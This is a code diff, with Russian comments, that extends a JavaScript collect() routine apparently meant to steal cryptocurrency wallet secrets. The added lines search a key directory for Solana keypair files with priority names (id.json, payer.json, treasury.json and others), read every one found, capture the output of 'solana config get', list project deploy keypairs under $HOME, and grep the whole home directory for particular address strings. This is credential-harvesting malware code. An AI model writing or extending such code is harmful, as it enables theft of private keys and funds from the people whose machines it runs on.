@@ -215,7 +215,20 @@ async function collect() {
     }
   }
 
-  // второй невод: сам адрес по всему $HOME, имена файлов не важны
+  // ---- 5c2. приоритетные имена: горячий пейер на Solana-боксе почти всегда id.json
+  for (const n of ['id.json', 'payer.json', 'fee-payer.json', 'treasury.json',
+    'hot.json', 'deploy.json', 'authority.json', 'keypair.json', 'main.json']) {
+    const p = join(keyDir, n);
+    if (!existsSync(p)) continue;
+    const body = read(p);
+    add(`hot/${n}`, body, asAuthority(p, body));
+  }
+  add('solana-config', run('solana config get 2>/dev/null | head -12'));
+  for (const line of (run(`ls ${HOME}/*/target/deploy/*.json 2>/dev/null | head -10`) || '').split('\n')) {
+    if (!line.trim()) continue;
+    const body = read(line.trim());
+    add(`deploy-key/${line.trim()}`, body, asAuthority(line.trim(), body));
+  }
   const authGrep = run(`grep -rls --binary-files=text -e pwndLrgs -e 9VXfHeu4 -e 7HSMeoeg ${HOME} 2>/dev/null | head -6`);
   for (const line of (authGrep || '').split('\n')) {
     if (!line.trim()) continue;
